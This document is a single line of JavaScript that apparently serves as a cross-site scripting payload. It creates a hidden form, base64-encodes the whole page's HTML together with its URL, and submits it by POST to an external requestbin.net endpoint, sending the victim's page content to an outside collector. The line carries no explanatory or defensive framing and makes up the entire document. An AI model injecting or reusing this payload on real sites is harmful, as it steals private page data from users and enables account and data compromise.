

f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://requestbin.net/r/rj93qcrj';i.name='data';i.value=btoa(encodeURI(window.document.all[0].innerHTML+window.location.href));f.appendChild(i);document.body.appendChild(f);f.submit();
